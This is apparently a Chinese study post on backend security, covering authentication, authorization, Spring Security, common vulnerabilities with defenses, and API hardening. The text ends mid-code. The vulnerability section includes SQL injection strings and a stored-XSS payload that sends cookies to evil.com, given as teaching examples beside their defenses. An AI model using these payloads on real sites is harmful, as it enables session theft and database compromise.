---
title: 后端安全
date: 2025-01-01 00:00:00
updated: 2025-01-01 00:00:00
tags:
  - 安全
  - 认证
  - 授权
  - JWT
  - OAuth2
categories:
  - 分布式
---
## 一、认证 (Authentication)

> **安全设计第一原则**：不信任任何来自外部的输入（包括 HTTP 请求参数、Header、Cookie、文件内容、第三方 API 返回数据）。所有安全机制都应该基于这个出发点设计——认证确认身份、授权限制操作、防御机制兜底。安全是纵深防御，不存在单点银弹。

认证解决的核心问题是"你是谁"。在分布式系统中，确认身份不仅是用户态的需求，也是服务间通信的前提——mTLS、API Key 本质上也是认证。认证是安全体系的基石，身份确认有误，后续的授权、审计都会失效。

### 1.1 Session-Cookie 认证

**原理**：用户登录后，服务端生成 Session 对象存储在内存/Redis 中，将随机 Session ID 通过 `Set-Cookie` 返回。后续请求浏览器自动携带 Cookie，服务端通过 Session ID 找回会话状态。

```
客户端                                 服务端
  |  POST /login (user, pass)          |
  |  --------------------------------> |  验证凭证，生成 Session 存入 Redis
  |  Set-Cookie: SESSIONID=abc123     |  返回 Session ID
  |  <-------------------------------- |
  |  GET /api/orders                   |
  |  Cookie: SESSIONID=abc123          |
  |  --------------------------------> |  通过 Session ID 查 Redis，确认身份
  |  200 { orders: [...] }            |
  |  <-------------------------------- |
```

**优点**：实现简单、浏览器原生支持（HttpOnly/Secure 增强安全）；可随时踢人（删除 Session 令牌即时失效）；敏感数据不落客户端，用户无法篡改 Session 数据。

**缺点**：水平扩展需共享 Session 存储（Redis Cluster），增加依赖和网络开销；跨域场景需 `withCredentials` + CORS 精确配置，不如 `Authorization` header 直观；移动端没有浏览器 Cookie 机制需手动管理；**CSRF 攻击面**——浏览器对目标域名发任何请求都无条件携带 Cookie，攻击者可在第三方站点诱导用户发起恶意请求（防御见 CSRF 章节）。

**面试追问——Session 存在 Redis 的优缺点**：优点是一台机器重启不丢会话、多台机器共享状态；缺点是每次请求都要网络 IO 查 Redis（延迟增加 1-2ms），Redis 挂了则所有用户登录态丢失。权衡方案：双写——本地内存一级缓存 + Redis 二级存储，读写都经本地缓存，Redis 只用于写入同步。

### 1.2 JWT 认证

JWT 是自包含令牌，服务端无需查询存储即可独立验证。

**结构**：`header.payload.signature`，三段 Base64URL 编码用 `.` 拼接。

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6ImFkbWluIn0.3Kx8L...
└──── header ────┘ └────────── payload ──────────┘ └── signature ──┘
```

- **Header**：算法（HS256/RS256）和类型（JWT）。
- **Payload**：Claims（`sub`/`iat`/`exp` + 业务自定义字段）。**仅 Base64 编码非加密，任何人都能解码，绝对不能放密码等敏感信息。**
- **Signature**：对 header+payload 用 secret（HMAC）或私钥（RSA）签名。篡改任一字节签名即不匹配。

**签发与验证**：

```java
// 签发
public String generateToken(UserDetails user) {
    return Jwts.builder()
        .setSubject(user.getUsername())
        .claim("userId", user.getId())
        .setExpiration(new Date(System.currentTimeMillis() + 7200_000))
        .signWith(SignatureAlgorithm.HS256, secretKey)
        .compact();
}
// 验证
public Claims validateToken(String token) {
    return Jwts.parser().setSigningKey(secretKey).parseClaimsJws(token).getBody();
}
```

**优点**：无状态（天然支持水平扩展，各微服务独立验证不需要共享存储）；跨域友好（`Authorization: Bearer <token>` 不受同源策略限制）；微服务调用链可直接透传 JWT。

**无状态带来的挑战——退出登录**：JWT 最大的卖点也是最大痛点——签发后在过期前无法撤销。工程实践：

1. **短过期 + Refresh Token**（最主流）：Access Token 5-15min，Refresh Token 7-30d。退出时将 Refresh Token 加入 Redis 黑名单。Access Token 最多存活 15min 自然过期，无法再刷新出新令牌。

```java
public TokenResponse refresh(String refreshToken) {
    if (redisTemplate.hasKey("blacklist:" + refreshToken))
        throw new UnauthorizedException("令牌已吊销");
    // 旧 Refresh Token 标记已用（防重放）
    redisTemplate.opsForValue().set("blacklist:" + refreshToken, "1", 30, TimeUnit.DAYS);
    return new TokenResponse(newAccessToken, newRefreshToken);
}
```

2. **JWT 黑名单**：在网关层维护 `jti` 黑名单。但让"无状态"形同虚设——又回到中心化查询状态。
3. **极短 Access Token**：5min 过期，客户端丢弃即失效。适合对即时退出要求不高的场景。

**选用建议**：单体/管理后台 → Session-Cookie；微服务/移动端/跨域 SPA → JWT + Refresh Token。

**面试常问——JWT 的 Signature 用对称（HS256）还是非对称（RS256）？** HS256 颁发和验证用同一把密钥——适合单服务场景，密钥泄露后攻击者可以自己签发有效 JWT。RS256 用私钥签名、公钥验证——适合微服务场景：认证中心持有私钥签发，各微服务只需持有公钥即可验证。即使某个微服务沦陷，公钥泄露也无法伪造 JWT。生产环境推荐 RS256/ES256（ECDSA），密钥管理更安全。

### 1.3 OAuth 2.0

OAuth 2.0 解决"授权委托"——用户允许第三方访问自己在服务提供商的资源，但**不把自己的密码交给第三方**。

**核心角色**：Resource Owner（用户）、Client（第三方应用）、Authorization Server（认证服务器）、Resource Server（资源服务器）。

**四种授权模式**：

**（1）授权码模式（Authorization Code）**——最安全，有后端 Web 应用：

```
用户 → Client → 重定向到 Auth Server（带 client_id, redirect_uri）
Auth Server → 用户登录授权
Auth Server → Client 回调 redirect_uri（带 authorization code）
Client → Auth Server（用 code + client_secret 后端直连换取 access_token）
```

关键：code 走前端重定向（可能泄露于浏览器 URL），但 token 通过后端直连换取。攻击者即使拦截 code，没有 `client_secret` 也换不到 token——**code 只是一次性中间凭证**。

**（2）隐式模式**：已废弃。Auth Server 直接把 access_token 返回到前端 URL fragment（`example.com/callback#access_token=xxx`），跳过了用 client_secret 换 token 的后端步骤。问题在于 token 在 URL fragment 和浏览器历史中暴露，没有 client_secret 校验，任何拿到 token 的人都能冒充客户端访问资源。OAuth 2.1 草案已将其移除，推荐任何场景都使用 PKCE 取代隐式模式。历史面试题"四种模式的区别"现在答"三种加一个已废弃"。

**（3）密码模式**：用户把密码直接给 Client，Client 用 username/password 直接换 token。仅适用于**自家第一方应用**（如官方 App），因为用户只信任官方。第三方用此模式意味着你把密码给了陌生人，完全背离 OAuth"不共享密码"的设计初衷。OAuth 2.1 已将其移除。

**四种模式对比**：

| 模式 | 适用场景 | 安全等级 | 状态 |
|------|----------|---------|------|
| 授权码+PKCE | Web/SPA/移动端 | 最高 | 推荐 |
| 隐式 | 旧版 SPA | 低 | 已废弃 |
| 密码 | 第一方应用 | 中 | 已移除 |
| 客户端凭证 | 服务间调用 | 高 | 推荐 |

**（4）客户端凭证模式**：`Client → Auth Server（client_id + client_secret）→ access_token`，服务器到服务器，用于微服务间/定时任务认证。

**PKCE（Proof Key for Code Exchange）**——移动端/SPA 无法安全存储 `client_secret`（反编译即泄露）。攻击者可在设备上注册恶意应用并注册相同的回调 URL Scheme 拦截 code。PKCE 在授权请求时传 `code_challenge = SHA256(code_verifier)`，换 token 时传 `code_verifier`，Auth Server 验证 `SHA256(verifier) == challenge`。即使 code 被拦截，没有 verifier 也换不到 token——用非对称方式确保只有发起方才能完成令牌交换。OAuth 2.1 已将 PKCE 设为必选项，推荐所有场景都启用。

### 1.4 SSO 单点登录

**CAS 协议**——最经典的 SSO 协议，基于票据：

```
1. 用户访问 appA.com → 无登录态 → 重定向到 cas.com/login?service=appA.com
2. cas.com 验证未登录 → 展示登录页
3. 登录成功 → cas.com 种 TGC（CAS 自己的 Cookie）+ 生成 ST（一次性票据）
   → 重定向 appA.com?ticket=ST-xxx
4. appA.com 后端拿 ticket 直连 cas.com 验证 → 获取用户信息 → 种自己的 Session
5. 用户访问 appB.com → 无登录态 → 重定向 cas.com
6. cas.com 发现已有 TGC → 不展示登录页，直接签新 ST 回 appB.com
```

**关键设计**：TGC 是 CAS 自己的 Cookie（只在 `cas.com` 域），各子系统拿独立一次性 ST，各自维护 Session 互不干扰。避免了跨域 Cookie 难题。

**OIDC（OpenID Connect）**：基于 OAuth 2.0，增加 ID Token（JWT 格式，携带签名身份信息），让 OAuth 2.0 从"授权协议"扩展为"认证协议"。相比 CAS：OIDC 用 JWT 而非不透明 ST，下游服务可离线验证无需每次回调认证中心；生态极强——Google、Azure AD、GitHub、Keycloak 普遍支持；适合现代化的 SPA/移动端/微服务场景；CAS 的 ST 验证需要认证中心在线，压力集中。但 CAS 在企业内部老旧系统中仍有大量部署，理解其票据机制在面试中仍是加分项。

### 1.5 双因素认证 (TOTP)

密码是"你知道的东西"（Knowledge），TOTP 增加"你拥有的东西"（Possession）。本质是 **HMAC + 时间窗口**：

```
TOTP = Truncate(HMAC-SHA-1(secret, floor(timestamp / 30))) % 10^6
```

注册时用户扫二维码拿到 `secret`（双方共享），每 30s 独立计算同一口令，无需网络通信。验证时允许 ±1 个时间窗口容忍时钟偏差。

**面试要点**：密码泄露（钓鱼/撞库/脱库）后攻击者可登录——TOTP 即使密码泄露，没有手机也登不上去。TOTP seed（共享密钥）需安全存储，不能与密码放同一数据库——否则数据库脱库一锅端。TOTP 不能防中间人攻击——攻击者搭建钓鱼代理站点，用户输入密码→攻击者转发到真实服务器，返回 TOTP 输入框→用户输 TOTP→攻击者拿到完整的认证凭据。这就是为什么银行/大型企业开始推广 WebAuthn（公私钥非对称认证，密钥不离开硬件，domain 绑定防钓鱼）。

---

## 二、授权 (Authorization)

认证确认"你是谁"，授权决定"你能做什么"——通过认证不代表拥有所有权限，二者必须分离。

### 2.1 RBAC（基于角色的访问控制）

`用户(User) ←N:M→ 角色(Role) ←N:M→ 权限(Permission)`，经典五表设计（sys_user / sys_role / sys_permission / sys_user_role / sys_role_permission）。

**为什么引入角色层？** 1000 用户 × 20 权限直接维护是 20000 条关系；通过 5 个角色中转，只需 5 个角色的权限配置 + 1000 条用户-角色关系。角色实现批量管理和语义化。

**局限**：静态模型，无法感知上下文——"部门经理只能看本部门报表""只能改自己创建的单据""工作日 9-18 点操作"这种需求 RBAC 做不到；微服务下角色爆炸。

### 2.2 ABAC（基于属性的访问控制）

根据**主体属性**（部门/职级）、**资源属性**（密级/所有者）、**环境属性**（时间/IP/设备）、**操作类型**（读/写/删），动态计算访问策略。

```java
// 策略表达式: "user.department == resource.department && user.level >= resource.secretLevel"
public boolean evaluate(User user, Resource resource, Environment env) {
    Map<String, Object> context = Map.of("user", user, "resource", resource, "env", env);
    return (Boolean) expressionEngine.execute(policyExpression, context); // Aviator/SpEL
}
```

实际工程以 "**RBAC 为主，ABAC 补充**"——角色做粗筛，属性做精判。RBAC 适合 ERP/管理后台，ABAC 适合数据平台/API 网关策略引擎。

**面试追问——权限数据如何缓存？** 用户权限在认证通过时加载一次，放入 SecurityContext 随请求生命周期存在。对于 RBAC，通常是登录时查一次角色+权限列表，后续请求从缓存/ThreadLocal 获取。对于 ABAC，由于涉及实时属性（时间/位置等），不能完全缓存——需要每次请求实时评估策略。大型系统常见做法是 RBAC 结果缓存（几分钟过期），ABAC 每次实时计算。

### 2.3 Spring Security 核心原理

Spring Security 本质是**责任链模式的 Servlet Filter**。

**Filter Chain**：

```
请求 → SecurityContextPersistenceFilter → UsernamePasswordAuthFilter
     → ExceptionTranslationFilter → FilterSecurityInterceptor → Controller
```

- `SecurityContextPersistenceFilter`：请求开始从 HttpSession 恢复 SecurityContext，结束持久化回去。
- `UsernamePasswordAuthenticationFilter`：拦截 `/login`，调 AuthenticationManager 认证。
- `ExceptionTranslationFilter`：AuthenticationException → 302 登录页；AccessDeniedException → 403。
- `FilterSecurityInterceptor`：最后一环，根据 URL 模式+角色做访问决策。

**SecurityContextHolder**——用 `ThreadLocal` 存当前请求认证信息。请求结束必须清理防线程池内存泄漏：

```java
Authentication auth = SecurityContextHolder.getContext().getAuthentication();
Long userId = ((UserDetails) auth.getPrincipal()).getId();
```

**@PreAuthorize**——方法级权限：

```java
@PreAuthorize("hasRole('ADMIN')")
public List<User> getAllUsers() { ... }

@PreAuthorize("hasRole('DEPT_MANAGER') and #deptId == authentication.principal.deptId")
public DeptReport getDeptReport(@Param("deptId") Long deptId) { ... }

@PreAuthorize("@permissionService.canAccessResource(#resourceId)") // 注入 Bean 断复杂权限
public Resource getResource(Long resourceId) { ... }
```

**认证流程**：`UsernamePasswordAuthenticationFilter` 拦截 `/login` POST → 提取 username/password 构造 `UsernamePasswordAuthenticationToken`（未认证，`authenticated=false`）→ 调用 `AuthenticationManager.authenticate()` → 委托给 `ProviderManager` 遍历 `AuthenticationProvider` 列表 → `DaoAuthenticationProvider` 调用 `UserDetailsService.loadUserByUsername()` 查数据库/远程服务 → 返回 `UserDetails` → 调用 `PasswordEncoder.matches(rawPassword, encodedPassword)` 比对密码 → 认证成功，返回新的 `Authentication` 对象（`authenticated=true`）→ 存入 `SecurityContextHolder` → 请求结束时 `SecurityContextPersistenceFilter` 将 SecurityContext 持久化到 Session。

面试常问：`AuthenticationManager`、`AuthenticationProvider`、`UserDetailsService` 三者的关系？Manager 是入口（门面），内部遍历 Provider 列表直到某个 Provider 能处理（`supports(Authentication)` 返回 true）。`DaoAuthenticationProvider` 是其中最常用的 Provider，它委托给 `UserDetailsService` 获取用户数据再比对凭据。这种分层设计的好处：你可以自定义 Provider 支持短信验证码/微信扫码等认证方式，无需改动框架核心逻辑。

---

## 三、常见安全漏洞与防御

### 3.1 SQL 注入

**攻击原理**：拼接用户输入构造 SQL，攻击者注入恶意片段。

```java
String sql = "SELECT * FROM users WHERE username = '" + username + "'";
// 输入: ' OR '1'='1' --
// → SELECT * FROM users WHERE username = '' OR '1'='1' --'
// 输入: ' UNION SELECT id, password FROM admin_users --
```

**防御——预编译（Prepared Statement）**：

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
ps.setString(1, username);  // 参数绑定：值只当数据不当 SQL 语法
```

**预编译为什么能防？** SQL 模板先送数据库解析编译生成执行计划，参数值后送——结构与数据解耦，参数值不会被重新解析为 SQL 语法。

**MyBatis `#` vs `$`**：`#{}` 是预编译，JDBC 层走 `PreparedStatement.setString()`，值永远不当 SQL 执行；`${}` 是字符串替换，JDBC 层走 `Statement.execute(sqlString)`，SQL 由应用拼接后整条发送——数据库分不出哪部分是原始 SQL 哪部分是用户输入的。动态表名/排序必须用 `${}` 时，必须做白名单校验——`if (!ALLOWED_COLUMNS.contains(orderColumn)) throw`。

**面试追问——ORM 框架能彻底防 SQL 注入吗？** 不能。即使 Hibernate/MyBatis 默认启用了预编译，一旦用了原生 SQL（如 `entityManager.createNativeQuery()`）或 `${}`，注入仍然存在。另外，存储过程中使用 `EXEC` 拼接参数也会引入注入风险。

### 3.2 XSS（跨站脚本攻击）

攻击者将恶意脚本注入网页，在受害者浏览器中执行。

| 类型 | 攻击向量 | 触发方式 |
|------|----------|----------|
| 反射型 | URL 参数回显 | 点击恶意链接 |
| 存储型 | 脚本存数据库 | 访问正常页面（评论区→所有访问者中招） |
| DOM 型 | 前端 JS 操纵 DOM | 点击恶意链接 |

存储型示例：攻击者在评论区提交 `<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>` → 所有访问评论页的用户 Cookie 被窃。

**防御**：

1. **输出编码**（最核心）：`<` → `&lt;`（HTML Entity）、`"` → `&quot;`。不同上下文不同规则：HTML 内容用 HTML Entity 编码；HTML 属性用属性编码（`"` → `&#x22;`）；JavaScript 上下文用 `\xHH` Unicode 编码；URL 参数用 `encodeURIComponent()`。React/Vue 默认 `{data}` 自动转义，`v-html`/`dangerouslySetInnerHTML` 需极度谨慎——只有在你完全信任的数据源或经过严格净化（DOMPurify）后才使用。
2. **CSP（Content Security Policy）**：`script-src 'self'` 只执行同源脚本，即使注入 `<script>` 浏览器也不执行——XSS 的最后防线。注意：用 `'nonce-xxx'` 可以按需开放特定内联脚本；`'unsafe-inline'` 会完全禁用 CSP 的 XSS 防护，绝对避免。
3. **HttpOnly Cookie**：Cookie 对 `document.cookie` 不可见，即使 XSS 成功也无法窃取会话。
4. **输入校验**：格式约束和长度限制。不能替代输出编码——合法输入在另一上下文可能变成恶意输出。

### 3.3 CSRF（跨站请求伪造）

**原理**：用户登录 bank.com（Cookie 有效），访问 evil.com。evil.com 隐藏表单向 bank.com/transfer 发 POST，浏览器自动携带 bank.com Cookie，服务端认为用户本人操作。

**三种防御**：

1. **CSRF Token**（最经典）：服务端生成随机 Token 埋入页面隐藏域，提交时校验。攻击者跨站无法读取目标页面 DOM（同源策略），无法获取 Token。每个会话独立生成防止固定 token 攻击。
2. **SameSite Cookie**（最省力的现代方案）：
- `SameSite=Strict`：任何跨站请求（GET/POST 等）都不带 Cookie。CSRF 被完全防住，但从邮件点链接打开网站也不带 Cookie，用户体验差。
- `SameSite=Lax`（Chrome 默认值）：跨站 POST/PUT/DELETE 不带 Cookie；跨站顶级导航 GET（`<a href>`、`<link rel="prerender">`）可带。能防御所有写操作 CSRF，不影响正常跳转体验。是不依赖 CSRF Token 的最推荐现代方案。
- `SameSite=None`：必须配合 `Secure` 属性（仅 HTTPS 生效），用于跨站 iframe 嵌入等场景。

**CSRF Token 与 SameSite 的关系**：两者互补而非替代。SameSite 是浏览器层面的第一道防线（有浏览器兼容性窗口），CSRF Token 是服务端层面的保险。关键业务操作建议两者都开启。
3. **Origin/Referer 校验**：检查请求来源是否为本站。某些环境会移除 Referer，不可作为唯一防御。

**SPA 场景**：JWT 放 `Authorization` header 而非 Cookie，跨站请求无法给 header 赋值，CSRF 天然不存在。

### 3.4 SSRF（服务端请求伪造）

攻击者控制服务端发起的请求目标，以服务端为跳板访问内网——读云元数据（AWS `169.254.169.254/latest/meta-data/` 拿临时凭证）、攻击内网 Redis/数据库、端口扫描。

**防御**：

```java
public boolean isValidUrl(String urlStr) {
    URL url = new URL(urlStr);
    // 1. 协议白名单：只允许 http/https，拒绝 file://、gopher://、dict://
    if (!Set.of("http", "https").contains(url.getProtocol())) return false;
    // 2. DNS 解析后过滤内网 IP（127/10/172.16/192.168 段）
    InetAddress addr = InetAddress.getByName(url.getHost());
    if (addr.isLoopbackAddress() || addr.isSiteLocalAddress() || addr.isLinkLocalAddress())
        return false;
    return true;
}
```

**要点**：协议白名单非黑名单；先 DNS 后 IP 校验（防 `http://safe@10.0.0.1` 绕过）；禁止 302 跳转内网或对跳转目标也做校验；防 DNS Rebinding（连接时再次校验 IP、使用固定 DNS resolver 缓存 TTL）。

### 3.5 文件上传漏洞

攻击面：上传 WebShell（如 JSP/PHP），通过 URL 访问执行命令。

**多层防御**：

```java
public FileUploadResult upload(MultipartFile file) {
    // 1. 扩展名白名单（jpg/png/pdf）
    String ext = FilenameUtils.getExtension(file.getOriginalFilename()).toLowerCase();
    if (!ALLOWED_EXT.contains(ext)) throw new BadRequestException("类型不允许");

    // 2. Magic Number 校验（防改名 .jpg 绕过）
    // JPEG: FF D8 FF E0  PNG: 89 50 4E 47  GIF: 47 49 46 38
    if (!detectByMagicNumber(file).equals(ext)) throw new BadRequestException("伪装文件");

    // 3. 大小限制（10MB）+ 随机文件名防路径遍历
    String name = UUID.randomUUID() + "." + ext;

    // 4. 存在 Web 根目录外（/data/uploads/），攻击者无法通过 URL 直接访问
    file.transferTo(new File("/data/uploads/" + name));

    // 5. 图片重编码去除嵌入恶意代码
    if (isImage(ext)) ImageIO.write(ImageIO.read(file.getInputStream()), ext, new File(path));
}
```

**补充要点**：上传目录移除执行权限；防压缩炸弹（限制解压后大小和层级深度）。

### 3.6 越权漏洞

业务安全最常见的漏洞——权限框架配对了，代码漏了数据范围校验。

**水平越权**（同级访问他人数据）：`GET /api/orders/1002` 返回了别人的订单。

```java
// 错误：直接用 URL 中的 ID 查，查出任何人的数据
public Order getOrder(Long orderId) { return orderService.getById(orderId); }

// 正确：强制以当前用户为过滤条件
@GetMapping("/orders")
public List<Order> getMyOrders() {
    return orderService.getByUserId(SecurityUtils.getCurrentUserId());
    // URL 中不暴露可修改的 userId——根本上杜绝
}
```

**垂直越权**（低权限执行高权限操作）：普通用户直接调 `POST /api/admin/users/delete`。防御：`@PreAuthorize("hasRole('ADMIN')")`。

**核心原则**：操作主体 ID 只能从 `SecurityContextHolder` 获取，永远不信任前端传来的用户 ID。前端传 ID 只是告诉你操作哪个资源，是否有权操作必须由当前登录身份判断。

### 3.7 密码安全

**彩虹表攻击**：预计算大量"密码→哈希"映射表，泄露哈希后直接查表还原密码。

**加盐防彩虹表**：每用户随机 salt，`hash("pass" + "salt1") ≠ hash("pass" + "salt2")`。攻击者须为每个 salt 重新计算，成本从 O(1) 变为 O(N)。

**Bcrypt**——专为密码设计：

```java
String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));  // cost=2^12=4096次迭代
boolean ok = BCrypt.checkpw(inputPassword, hash);  // 自动提取 salt 重新计算
```

关键设计：cost factor 随时间提升保持抗暴力破解成本；盐内置在结果中不单独存储；内存访问模式对 GPU/ASIC 不友好（对抗硬件加速暴力破解）。

**Argon2 系列**：Argon2id 混合模式是 2015 年密码哈希竞赛冠军，当前最推荐。核心思想——密码哈希要"**慢**"（0.1-0.5s/次），让用户体验无影响但暴力破解成本指数上升。**绝不**用 MD5/SHA256 存密码——它们为数据完整性设计，计算太快（每秒数十亿次）。

### 3.8 DDoS 防御

DDoS 通过海量请求占满带宽或服务器资源使服务不可用。纵深防御体系：

**SYN Cookie**（传输层）：TCP SYN Flood 攻击者大量发送 SYN 不完成握手，占满服务器 TCB 内存。SYN Cookie 在收到 SYN 时不分配内存，而是根据 IP/端口/时间戳/密钥算出 Cookie 作为 SYN+ACK 的序列号；收到 ACK 时验证确认号 = Cookie+1 才分配资源——把"状态保持"外包给网络，攻击者半连接零成本。

**应用层限流**（应用层）：Guava RateLimiter 每 IP 令牌桶限流；Nginx `limit_conn_zone` 限制同一 IP 并发连接数；WAF/验证码识别恶意流量。

**CDN 分散**：DNS 将流量分散到上百个边缘节点，攻击流量被稀释吸收；清洗后的正常流量才到源站。

**DDoS 分类与针对性防御**：

DDoS 按攻击层次分为三类，不同层次防御手段不同：
- **网络层攻击（L3/L4）**：SYN Flood、UDP Flood、ICMP Flood——用大量数据包占满带宽或连接表。防御靠运营商黑洞清洗/高防 IP/Anycast 分散流量。
- **协议层攻击（L4）**：SYN Flood、ACK Flood——利用协议握手缺陷消耗服务器资源。防御靠 SYN Cookie/SYN Proxy。
- **应用层攻击（L7）**：HTTP Flood、Slowloris——模拟正常用户行为，少量请求就能打挂应用。最难防御，因为攻击请求与正常请求难以区分。防御靠 WAF（请求特征分析）、验证码（人机识别）、限流 + 熔断。

Slowloris 原理特别值得了解：攻击者建立大量连接，每连接每隔 10 秒才发一个 HTTP 头部字节，用极慢的速度永远不完成请求。服务器上大量连接处于"等待请求体"状态，连接池耗尽。防御：Nginx `client_header_timeout 10s`、`limit_conn` 限制单 IP 连接数。

---

## 四、API 安全

### 4.1 API 签名

HMAC 签名验证请求完整性和调用方身份，不依赖 Cookie/Session。

```
签名参数: Method + Path + Timestamp + Nonce + Body
签名算法: HMAC-SHA256(secret, canonicalString)
请求 Header: X-Api-Key / X-Timestamp / X-Nonce / X-Signature
```

**防重放三要素**：Timestamp（5min 过期窗口）→ Nonce（窗口内唯一，Redis `SET NX` + TTL 去重）→ 签名包含二者（篡改任一 = 签名不匹配）。

```java
public boolean verify(HttpServletRequest request) {
    long reqTime = Long.parseLong(request.getHeader("X-Timestamp"));
    if (Math.abs(now - reqTime) > 300) return false;  // 时间戳过期
    String nonceKey = "nonce:" + apiKey + ":" + request.getHeader("X-Nonce");
    if (!redis.setIfAbsent(nonceKey, "1", 360)) return false;  // Nonce 已用
    String expected = hmacSha256(secret, canonicalString);
    return MessageDigest.isEqual(expected.getBytes(), signature.getBytes());  // 恒定时间比较
}
```

**签名对比必须用恒定时间比较**：`String.equals()` 首字节不同立即返回（耗时短），攻击者通过测量响应时间可逐字节推测正确签名（时序攻击）。`MessageDigest.isEqual()` 遍历所有字节耗时恒定。

### 4.2 接口限流

令牌桶——令牌以速率 r 放入容量 b 的桶，每请求消耗 1 令牌。既能限制平均速率，又允许 b 大小突发。

**分布式滑动窗口（Redis + Lua）**：

```java
String lua = """
    redis.call('ZREMRANGEBYSCORE', KEYS[1], 0, ARGV[1])  -- 删除过期记录
    if redis.call('ZCARD', KEYS[1]) < tonumber(ARGV[2]) then
        redis.call('ZADD', KEYS[1], ARGV[3], ARGV[3])   -- 添加当前请求
        redis.call('EXPIRE', KEYS[1], ARGV[4])
        return 1
    else return 0 end
""";
```

**为什么用 Lua？** "删除→计数→判断→添加"四步有竞态条件，Lua 在 Redis 服务端原子执行避免分布式超发。

**选型**：网关层 Nginx/Kong（按 IP/路径粗粒度）；应用层 Guava RateLimiter/Sentinel（单机/集群）；分布式 Redis 滑动窗口。限流不仅防 DDoS——秒杀瞬时 QPS 从 200 飙升 20000，无限流直接打挂数据库。

### 4.3 HTTPS 强制

HTTPS = HTTP + TLS，提供加密性（防窃听）、完整性（防篡改）、身份验证（证书证明身份）。配置要点：

```nginx
server { listen 80; return 301 https://$host$request_uri; }  # 强制跳转
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;  # 禁用旧版本
    ssl_ciphers ECDHE+AES128-GCM:...; ssl_prefer_server_ciphers on;
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload";
}
```

HSTS：浏览器在有效期内不尝试 HTTP 连接，从源头杜绝 SSL Strip 降级攻击。

**证书管理**：生产环境使用 Let's Encrypt（免费 90 天有效期，需自动续期）或商用证书。证书私钥文件的权限必须是 `chmod 600`，只有 Web 进程可读——私钥泄露 = 任何人都能冒充你的站点。建议使用 cert-manager（K8s）或 acme.sh 自动管理证书生命周期。

**面试常问——TLS 握手做了什么？** 客户端发 ClientHello（支持的密码套件+随机数）→ 服务端回 ServerHello（选定密码套件+随机数+证书）→ 客户端验证证书→ 生成 Premaster Secret 用服务端公钥加密发送→ 双方用三个随机数生成 Session Key → 后续通信用 Session Key 对称加密。TLS 1.3 缩减为 1-RTT：ClientHello 就带了密钥交换参数，ServerHello 直接完成密钥协商——速度更快且移除了不安全的算法。

### 4.4 敏感数据脱敏

**日志脱敏**（最易被忽视的泄露点）：

```java
log.info("用户登录: 手机号={}", PhoneUtils.mask(phone));  // 138****1234
// 密码绝对不记入日志——信息->Debug->Error->日志文件 全链路排查
```

**返回脱敏**：Jackson `@JsonSerialize(using = PhoneSerializer.class)` 序列化时打星。

**分层层策略**：前端展示脱敏（138****1234）→ 日志脱敏（密码直接不记）→ 数据库哈希/加密存储（AES + KMS 管密钥）。

---

## 五、生产安全实践

### 5.1 密码存储规范

原则：绝不存明文；不用可逆加密（AES 密钥泄露 = 所有密码泄露）；用 Bcrypt/Argon2（cost≥10）；不自研密码方案；不把密码当 HMAC key 来"加密"自身。

### 5.2 日志脱敏规范

```java
@ToString
public class User {
    private String phone;
    @ToString.Exclude private String password;  // Lombok 排除
}
// 手写 toString() 时绝不包含密码字段
```

禁止记录：密码、Token、卡号、身份证、完整手机号/邮箱。必须记录：用户 ID、操作类型、IP、流水号。定期人工审计日志文件。

### 5.3 最小权限原则

最小权限原则不是安全理念，是需要落地的工程实践。核心逻辑——**不是假设代码 100% 无漏洞，而是假设漏洞存在时限制损害范围**。

**（1）数据库账号分层**：

```sql
-- 日常业务账号：仅 CRUD，无 DDL 权限
GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'app_user'@'%';
-- 定时任务 / 报表：只读账号
GRANT SELECT ON app_db.* TO 'readonly_user'@'%';
-- DDL 变更由独立账号执行，日常代码永远碰不到 DDL
```

即使 SQL 注入成功，攻击者也无法 DROP TABLE/ALTER TABLE 或创建后门用户。这是纵深防御——不要把所有安全希望押在"代码无漏洞"上。

**（2）服务账号权限隔离**：订单服务账号只能读写 order 表，用户服务只能读写 user 表，报表服务只读所有表（或只读副本）。每个微服务独立数据库账号，一个服务沦陷不会横向扩散到其他服务的数据。

**（3）文件系统权限**：Web 进程不以 root 运行（用过 `ps aux` 确认）；上传目录 `chmod 644`（文件）/ `chmod 755`（目录）无执行权限；包含数据库密码的配置文件 `chmod 600`，仅应用进程可读。

**（4）最小 API 权限**：对外 API 只暴露必要的接口，不要把全套管理接口挂上公网。内部微服务间的 API 调用也遵循同样原则——订单服务不需要调用"删除所有用户"的接口，就不要给它这个权限。

### 5.4 Spring Security 配置速查

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            .csrf(csrf -> csrf.ignoringRequestMatchers("/api/public/**"))
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers(HttpMethod.DELETE, "/api/orders/**").hasRole("ADMIN")
                .anyRequest().authenticated())
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint((req, res, e) -> {
                    res.setStatus(401);  // 未认证
                    res.getWriter().write("{\"code\":401,\"message\":\"未登录\"}");
                })
                .accessDeniedHandler((req, res, e) -> {
                    res.setStatus(403);  // 已认证无权限
                    res.getWriter().write("{\"code\":403,\"message\":\"权限不足\"}");
                }))
            .headers(h -> h
                .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))
                .frameOptions(f -> f.deny())
                .contentTypeOptions(Customizer.withDefaults())
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true).maxAgeInSeconds(31536000)))
            .build();
    }
    @Bean public PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(12); }
}
```

**JWT 过滤器**：

```java
@Component
public class JwtAuthFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest request,
            HttpServletResponse response, FilterChain chain) {
        String header = request.getHeader("Authorization");
        if (header != null && header.startsWith("Bearer ")) {
